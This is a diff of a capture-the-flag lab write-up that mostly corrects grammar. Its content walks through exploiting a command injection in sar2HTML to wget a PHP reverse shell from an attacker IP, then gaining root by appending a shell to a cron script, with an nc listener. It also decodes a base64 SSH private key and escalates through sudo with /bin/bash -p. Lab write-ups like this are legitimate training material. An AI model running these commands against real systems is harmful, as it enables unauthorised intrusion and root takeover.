@@ -84,29 +84,28 @@ DOWNLOADED: 4612 - FOUND: 4
 - Let test first command injection vulnerability
 ![3](https://user-images.githubusercontent.com/38728250/194197162-062c2164-878c-4daf-83da-ef8ec179f861.png)
 python3 is there
-- So let's input our own php-reverse-shell from pentestmonkey. The script will open an outbound TCP connection from the webserver to a host and port of specified on the source code. Bound to this TCP connection will be a shell.
+- So let's input our own php-reverse-shell from pentestmonkey. The script will open an outbound TCP connection from the webserver to a host and port specified on the source code. Bound to this TCP connection will be a shell.
     - 1. ``` git clone https://github.com/pentestmonkey/php-reverse-shell  ```
-    - 2. ``` Vim php-reverse-shell.php ``` and edit the ip address and port number to 1234
+    - 2. ``` Vim php-reverse-shell.php ``` and edit the IP address and port number to 1234
     - 3. and then running the server by Execute ``` python -m http.server 8008 ```
-    - 4. In the url execute ``` sar2HTML/index.php?plot=;wget+192.168.51.35:8008/php-reverse-shell.php ``` for upload the file on the server 
+    - 4. In the URL execute ``` sar2HTML/index.php?plot=;wget+192.168.51.35:8008/php-reverse-shell.php ``` for upload the file on the server 
     - 5. testing if the file has been uploaded ```index.php?plot=;ls```, yes it is uploaded 
-    - 6. Try to running it and Voila I have got the shell
+    - 6. Trying to run it and Voila I have got the shell
     - Take the first step by taking a proper terminal shell by the command ```import put:pty.spawn(‘/bin/bash’);```
     - There we go
-    - Let’s execute privilege escalation script (LinEnum is one such script that can be incredibly useful for privilege escalation on Linux systems.) on /var/tmp
+    - Let’s execute the privilege escalation script (LinEnum is one such script that can be incredibly useful for privilege escalation on Linux systems.) on /var/tmp
     - On my machine
     - ```cd tools/LinEnum```
     - And upload the file on the attacked machine by
     - ```Wget http://192.168.51.35/LinEnum.sh```
-    - And there we are, and then I run the script and checking for the output and analyzing the data so what all the results we have got by the linux enumeration script.
-    - so I found a cron job of a file which is getting executed with ```sudo ./finally.sh``` inside ```/var/www/html``` dir
-    - The file ```finally.sh``` has no write permission, On the other hand the ```write.sh``` has the execute permission.
+    - And there we are, and then I run the script, and I check for the output and analyze the data, so I found a cron job of a file that is getting executed with ```sudo ./finally.sh``` inside ```/var/www/html``` dir
+    - The file ```finally.sh``` has no write permission, On the other hand, the ```write.sh``` has the execute permission.
     - So as we have the permissions to ```write.sh``` we upload our shell, php shell to our ```/www/html``` dir.
-    - Lets start a reverse http server 
+    - Let's start a reverse http server 
     -  ```python -m http.server 8008```
     - Update the port on ```rev.php``` to 1337
     - Upload the script in ```/var/www/html$ wget 192.168.51.35:8008/php-reverse-shell.php```
-    - Start listen to the port 1337 by ```nc -lvp 1337```
+    - Start listening to the port 1337 by ```nc -lvp 1337```
     - ```Echo “php ./rev.php”  >> write.sh```
     - And yes we have got our root user shell
     - Capture the flag
@@ -252,10 +251,8 @@ dW9SaVNoaDZ1Q2pHQ0NIL1dmd0NvZjllbkNlajRIRWo1RVBqOG5aMGNNTnZvQVJxN1ZuQ05HVFBh
 bWNYQnJmSXd4Y1ZUCjhuZksyb0RjNkxmckRtalFBQUFBbHZjMk53UUc5elkzQT0KLS0tLS1FTkQg
 T1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==
 ```
-
-what we have here looks like base64, i can tell by "==" and it starts with a capital 
-
-So the next step is to decode the file and see wath's the result will be 
+what we have here looks like base64, I can tell by "==" and it starts with a capital 
+So the next step is to decode the file and see what the result will be
 
 $ base64 -d secret.txt
 
@@ -349,8 +346,8 @@ uid=1000(oscp) gid=1000(oscp) groups=1000(oscp),4(adm),24(cdrom),27(sudo),30(dip
 
 ...that worked! We are logged in.
 
-So now i will try to get root privileges for that there's a few things we can do for example (upload LinEnum script that i used to get the privilege escalation in the Sar machine), but i'm not going to use that. 
-i'm going to exploiting sudo by /bin/bash -p
+So now I will try to get root privileges for that there are a few things we can do for example (upload LinEnum script that I used to get the privilege escalation in the Sar machine), but I'm not going to use that.
+I'm going to exploit sudo by /bin/bash -p
 
 ```javascript
 $ man bash | grep "privileged"
